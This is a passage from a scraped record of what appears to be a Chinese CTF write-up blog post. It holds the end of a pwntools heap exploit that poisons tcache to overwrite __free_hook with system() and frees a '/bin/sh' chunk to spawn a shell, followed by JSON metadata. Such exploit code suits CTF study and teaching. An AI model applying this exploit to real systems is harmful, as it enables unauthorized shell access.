class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token builtin\">raw_input</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nfree_hook <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>\nsys <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>free_hook<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/bin/sh\\x00\"</span><span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\ndele<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\nr<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>", "first_tag": "PHP", "cpp": 1, "csharp": 0, "python": 1, "javascript": 0, "java": 0, "sql": 1, "php": 1, "time": "2022-05-25 20:26:58", "summary": "冬奥会代码审计解题过程如下："}